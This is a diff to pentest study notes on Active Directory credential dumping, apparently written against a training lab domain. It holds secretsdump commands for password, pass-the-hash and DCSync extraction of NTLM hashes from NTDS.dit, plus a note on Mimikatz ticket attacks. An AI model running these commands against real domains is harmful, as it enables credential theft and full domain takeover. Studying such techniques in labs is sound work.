@@ -16,7 +16,7 @@ When completed, CME writes the results to a JSON file located at /tmp/cme_spider
 however cme need local admin on target to dump !!  
 secretsdump marvel.local/fcastle:'Password1'@10.1.1.1  //with domain user pass  
 secretsdump administrator@10.1.1.1 -hashes NTLM:HASH   //local user hash //also reveals wdigest cleartext creds if any    
-
+secretsdumpy.py marvel.local/pparker:'Password123'@10.1.1.1 -just-dc-ntlm   //dc Sync -- ntlm creds dump from NTDS.dit being domain admin    
 
 **Mimikatz**: https://wadcoms.github.io/   https://hackviser.com/tactics/tools/mimikatz  
 tool to steal creds, generate kerberos tickets, pass hash attacks, silver and golden ticket attacks  
